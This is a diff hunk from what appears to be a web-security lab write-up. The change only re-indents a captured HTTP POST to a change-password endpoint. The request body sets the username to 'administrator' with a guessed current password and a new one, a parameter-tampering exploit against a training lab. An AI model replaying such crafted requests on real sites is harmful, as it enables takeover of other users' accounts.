@@ -130,25 +130,25 @@ we have to manipulate specific parameters in the request or so to test for the b
  
  
     POST /my-account/change-password HTTP/1.1
-Host: 0af200a303444b49c0479118006f0066.web-security-academy.net
-Cookie: session=cLpA7MwciG5r6gQg0qijALMT0lUaf6FK
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 131
-Origin: https://0af200a303444b49c0479118006f0066.web-security-academy.net
-Referer: https://0af200a303444b49c0479118006f0066.web-security-academy.net/my-account
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
-Connection: close
+    Host: 0af200a303444b49c0479118006f0066.web-security-academy.net
+    Cookie: session=cLpA7MwciG5r6gQg0qijALMT0lUaf6FK
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 131
+    Origin: https://0af200a303444b49c0479118006f0066.web-security-academy.net
+    Referer: https://0af200a303444b49c0479118006f0066.web-security-academy.net/my-account
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
 
-csrf=yMlABSWkf5sH22vGwGQQLiWMKK4lhUYl&username=administrator&current-password=idonn%27tknow&new-password-1=khan&new-password-2=khan
+    csrf=yMlABSWkf5sH22vGwGQQLiWMKK4lhUYl&username=administrator&current-password=idonn%27tknow&new-password-1=khan&new-password-2=khan
  
  
  
